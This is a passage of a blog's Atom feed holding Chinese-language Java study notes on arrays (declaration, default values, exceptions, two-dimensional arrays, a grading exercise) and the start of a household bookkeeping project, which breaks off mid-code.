class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">98</span>,-<span class="number">34</span>,<span class="number">2</span>,<span class="number">34</span>,<span class="number">54</span>,<span class="number">66</span>,<span class="number">79</span>,<span class="number">105</span>,<span class="number">210</span>,<span class="number">333</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> Arrays.binarySearch(arr3, <span class="number">210</span>);</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">            System.out.println(index);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;没找到&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-数组使用中的常见异常"><a href="#6-数组使用中的常见异常" class="headerlink" title="6. 数组使用中的常见异常"></a>6. 数组使用中的常见异常</h3><ol><li>数组角标越界的异常：ArrayIndexOutOfBoundsExcetion</li><li>空指针异常：NullPointerException</li></ol><h4 id="java-代码-1"><a href="#java-代码-1" class="headerlink" title="java 代码"></a>java 代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayExceptionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1. 数组角标越界的异常：ArrayIndexOutOfBoundsExcetion</span></span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="comment">//System.out.println(arr[5]);</span></span><br><span class="line">        <span class="comment">//System.out.println(arr[-2]);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.2. 空指针异常：NullPointerException</span></span><br><span class="line">        <span class="comment">//情况一</span></span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        arr1 = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//System.out.println(arr1[0]);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//情况二</span></span><br><span class="line">        <span class="type">int</span>[][] arr2 = <span class="keyword">new</span>  <span class="title class_">int</span>[<span class="number">4</span>][];</span><br><span class="line">        <span class="comment">//System.out.println(arr2[0][0]);   要初始化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//情况三：</span></span><br><span class="line">        String[] arr3 = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>, <span class="string">&quot;BB&quot;</span>, <span class="string">&quot;CC&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//arr3[0] = null;</span></span><br><span class="line">        System.out.println(arr3[<span class="number">0</span>].toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1406599484&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="算法" scheme="https://www.bandao.ltd/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="数组" scheme="https://www.bandao.ltd/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记7</title>
    <link href="https://www.bandao.ltd/coding/java/note/7.html"/>
    <id>https://www.bandao.ltd/coding/java/note/7.html</id>
    <published>2021-12-04T15:34:00.000Z</published>
    <updated>2024-11-04T03:12:49.885Z</updated>
    
    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1861224068&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h3><blockquote><p>数组(Array)，是多个相同类型数据按一定顺序排列的集合，并使用一个名字命名，<br>并通过编号的方式对这些数据进行统一管理</p></blockquote><h3 id="2-组成"><a href="#2-组成" class="headerlink" title="2. 组成"></a>2. 组成</h3><ol><li>数组名</li><li>元素</li><li>索引</li><li>数组的长度：元素的个数</li></ol><h3 id="3-特点"><a href="#3-特点" class="headerlink" title="3. 特点"></a>3. 特点</h3><ol><li>数组是有序排列的</li><li>数组属于引用数据类型的变量。数组的元素，既可以是基本数据类型，也可以是引用数据类型</li><li>创建数组对象会在内存中开辟一整块连续的空间</li><li>数组的长度一旦确定，就不能修改。</li></ol><h3 id="4-数组分类"><a href="#4-数组分类" class="headerlink" title="4. 数组分类"></a>4. 数组分类</h3><ol><li>按照维数：一维数组、二维数组、。。。</li><li>按照数组元素的类型：基本数据类型元素的数组、引用数据类型元素的数组</li></ol><h2 id="2-一维数组"><a href="#2-一维数组" class="headerlink" title="2. 一维数组"></a>2. 一维数组</h2><h3 id="1-一维数组的使用"><a href="#1-一维数组的使用" class="headerlink" title="1. 一维数组的使用"></a>1. 一维数组的使用</h3><ol><li>一维数组的声明和初始化</li><li>如何调用数组的指定位置的元素</li><li>如何获取数组的长度</li><li>如何遍历数组</li><li>数组元素的默认初始化值 ：见 ArrayTest1.java<blockquote><p>数组元素是整型：0<br>数组元素是浮点型：0.0<br>数组元素是 char 型：0 或’\u0000’，而非’0’<br>数组元素是 boolean 型：false<br>数组元素是引用数据类型：null</p></blockquote></li><li>数组的内存解析 ：见 ArrayTest1.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1. 一维数组的声明和初始化</span></span><br><span class="line">        <span class="type">int</span> [] ids;<span class="comment">//声明</span></span><br><span class="line">        <span class="comment">//1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行</span></span><br><span class="line">        ids = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>, <span class="number">04</span>, <span class="number">05</span>&#125;;</span><br><span class="line">        <span class="comment">//1.2动态初始化:数组的初始化和数组元素的赋值操作分开进行</span></span><br><span class="line">        String [] names = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">5</span>];</span><br><span class="line">        <span class="type">int</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr4 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;<span class="comment">//类型推断</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.如何调用数组的指定位置的元素:通过角标的方式调用。</span></span><br><span class="line">        names[<span class="number">0</span>] = <span class="string">&quot;00&quot;</span>;</span><br><span class="line">        names[<span class="number">1</span>] = <span class="string">&quot;11&quot;</span>;</span><br><span class="line">        names[<span class="number">2</span>] = <span class="string">&quot;22&quot;</span>;</span><br><span class="line">        names[<span class="number">3</span>] = <span class="string">&quot;33&quot;</span>;</span><br><span class="line">        names[<span class="number">4</span>] = <span class="string">&quot;44&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.如何获取数组的长度。(length)</span></span><br><span class="line">        System.out.println(names.length);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.如何遍历数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; names.length; i++) &#123;</span><br><span class="line">            System.out.println(names[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//5.数组元素的默认初始化值</span></span><br><span class="line">        <span class="type">int</span> [] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">short</span> [] arr1 = <span class="keyword">new</span> <span class="title class_">short</span>[<span class="number">4</span>];</span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="type">float</span>[] arr2 = <span class="keyword">new</span> <span class="title class_">float</span>[<span class="number">4</span>];</span><br><span class="line">        System.out.println(arr2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">4</span>];</span><br><span class="line">        System.out.println(arr3[<span class="number">0</span>]);            <span class="comment">//0</span></span><br><span class="line">        <span class="keyword">if</span>(arr3[<span class="number">0</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;你好！&quot;</span>);        <span class="comment">//进来这里</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span>[] arr4 = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">4</span>];</span><br><span class="line">        System.out.println(arr4[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        String [] arr5 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];</span><br><span class="line">        System.out.println(arr5[<span class="number">0</span>]);            <span class="comment">//null</span></span><br><span class="line">        <span class="keyword">if</span>(arr5[<span class="number">0</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;北京天气不错！&quot;</span>);  <span class="comment">//进来这里</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-一维数组例题"><a href="#2-一维数组例题" class="headerlink" title="2. 一维数组例题"></a>2. 一维数组例题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">从键盘读入学生成绩，找出最高分，并输出学生成绩等级。</span></span><br><span class="line"><span class="comment">        成绩&gt;=最高分-10    等级为’A’</span></span><br><span class="line"><span class="comment">        成绩&gt;=最高分-20    等级为’B’</span></span><br><span class="line"><span class="comment">        成绩&gt;=最高分-30    等级为’C’</span></span><br><span class="line"><span class="comment">        其余              等级为’D’</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.atguigu.exer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.使用Scanner，读取学生个数</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;学生人数&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> scanner.nextInt();</span><br><span class="line">        <span class="comment">//2.创建数组，存储学生成绩：动态初始化</span></span><br><span class="line">        <span class="type">int</span>[] scores = <span class="keyword">new</span> <span class="title class_">int</span>[number];</span><br><span class="line">        <span class="comment">//3.给数组中的元素赋值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;请输入&quot;</span> + number + <span class="string">&quot;个学生成绩：&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">maxScore</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; scores.length; i++) &#123;</span><br><span class="line">            scores[i] = scanner.nextInt();</span><br><span class="line">            <span class="comment">//4.获取数组中的元素的最大值:最高分</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (maxScore &lt; scores[i])&#123;</span><br><span class="line">                maxScore = scores[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//5.根据每个学生成绩与最高分的差值，得到每个学生的等级，并输出等级和成绩</span></span><br><span class="line">        <span class="type">char</span> level;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; scores.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (maxScore - scores[i] &lt;= <span class="number">10</span>)&#123;</span><br><span class="line">                level = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(maxScore - scores[i] &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">                level = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(maxScore - scores[i] &lt;= <span class="number">30</span>)&#123;</span><br><span class="line">                level = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                level = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;student&quot;</span> + i + <span class="string">&quot;成绩为&quot;</span> + scores[i] + <span class="string">&quot;等级为&quot;</span> + level);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-二维数组"><a href="#3-二维数组" class="headerlink" title="3. 二维数组"></a>3. 二维数组</h2><h3 id="1-二维数组的概念"><a href="#1-二维数组的概念" class="headerlink" title="1. 二维数组的概念"></a>1. 二维数组的概念</h3><blockquote><p>对于二维数组的理解，我们可以看成是一维数组 array1 又作为另一个一维数组 array2 的元素而存在。<br>其实，从数组底层的运行机制来看，其实没有多维数组</p></blockquote><h3 id="2-二维数组的使用"><a href="#2-二维数组的使用" class="headerlink" title="2. 二维数组的使用:"></a>2. 二维数组的使用:</h3><ol><li>二维数组的声明和初始化</li><li>如何调用数组的指定位置的元素</li><li>如何获取数组的长度</li><li>如何遍历数组</li><li>数组元素的默认初始化值 :见 ArrayTest3.java<blockquote><p>针对于初始化方式一：比如：int[][] arr &#x3D; new int[4][3];<br>外层元素的初始化值为：地址值<br>内层元素的初始化值为：与一维数组初始化情况相同</p><p>针对于初始化方式二：比如：int[][] arr &#x3D; new int[4][];<br>外层元素的初始化值为：null<br>内层元素的初始化值为：不能调用，否则报错。</p></blockquote></li><li>数组的内存解析 :见 ArrayTest3.java</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.二维数组的声明和初始化</span></span><br><span class="line">        <span class="type">int</span> [][] arr1 = <span class="keyword">new</span> <span class="title class_">int</span> [][]&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;, &#123;<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>&#125;&#125;;</span><br><span class="line">        String [][] arr2 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>][<span class="number">2</span>];</span><br><span class="line">        String [][] arr3 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">3</span>][];</span><br><span class="line">        <span class="type">int</span> arr4 [][] = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">10</span>&#125;,&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr5[] = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.如何调用数组的指定位置的元素</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//2</span></span><br><span class="line">        System.out.println(arr2[<span class="number">1</span>][<span class="number">1</span>]);     <span class="comment">//null</span></span><br><span class="line"></span><br><span class="line">        arr3[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>];            <span class="comment">//</span></span><br><span class="line">        System.out.println(arr3[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取数组的长度</span></span><br><span class="line">        System.out.println(arr4.length);    <span class="comment">//3</span></span><br><span class="line">        System.out.println(arr4[<span class="number">0</span>].length); <span class="comment">//3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//4.如何遍历二维数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr4.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr4[i].length; j++) &#123;</span><br><span class="line">                System.out.print(arr4[i][j] + <span class="string">&quot;\t&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayTest3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][<span class="number">3</span>];</span><br><span class="line">        System.out.println(arr);            <span class="comment">//  内存地址</span></span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);         <span class="comment">//  内存地址</span></span><br><span class="line">        System.out.println(arr[<span class="number">0</span>][<span class="number">0</span>]);      <span class="comment">//  0</span></span><br><span class="line"></span><br><span class="line">        <span class="type">float</span> [][] arr1 = <span class="keyword">new</span> <span class="title class_">float</span>[<span class="number">4</span>][<span class="number">3</span>];</span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]);         <span class="comment">//  内存地址</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>][<span class="number">0</span>]);      <span class="comment">//  0.0</span></span><br><span class="line"></span><br><span class="line">        String[][] arr2 = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">4</span>][<span class="number">3</span>];</span><br><span class="line">        System.out.println(arr2[<span class="number">0</span>]);         <span class="comment">//地址值</span></span><br><span class="line">        System.out.println(arr2[<span class="number">0</span>][<span class="number">0</span>]);      <span class="comment">//null</span></span><br><span class="line"></span><br><span class="line">        <span class="type">double</span>[][] arr3 = <span class="keyword">new</span> <span class="title class_">double</span>[<span class="number">4</span>][];</span><br><span class="line">        System.out.println(arr3[<span class="number">0</span>]);         <span class="comment">//null</span></span><br><span class="line">        <span class="comment">//System.out.println(arr3[0][0]);    //报错，空指针</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">
    &lt;div class=&quot;tag-plugin audio&quot;&gt;
    &lt;iframe src=&quot;//music.163.com/outchain/player?type=2&amp;id=1861224068&amp;auto=0&amp;height=32&quot; frameborder=&quot;no&quot;</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="数组" scheme="https://www.bandao.ltd/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>java project 家庭收支记账软件</title>
    <link href="https://www.bandao.ltd/coding/java/project/1.html"/>
    <id>https://www.bandao.ltd/coding/java/project/1.html</id>
    <published>2021-11-28T17:05:00.000Z</published>
    <updated>2024-11-09T09:12:09.852Z</updated>
    
    <content type="html"><![CDATA[    <div class="tag-plugin audio">    <iframe src="//music.163.com/outchain/player?type=2&id=1818128141&auto=0&height=32" frameborder="no" border="0" marginwidth="0" marginheight="0" width=288px height=52>    </iframe>    </div>    <h2 id="家庭收支记账软件"><a href="#家庭收支记账软件" class="headerlink" title="家庭收支记账软件"></a>家庭收支记账软件</h2><h3 id="1-自己编写的-java-文件"><a href="#1-自己编写的-java-文件" class="headerlink" title="1. 自己编写的 java 文件"></a>1. 自己编写的 java 文件</h3><h4 id="FamilyAccount-java"><a href="#FamilyAccount-java" class="headerlink" title="FamilyAccount.java"></a>FamilyAccount.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//FamilyAccount.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FamilyAccount</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isFlag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span 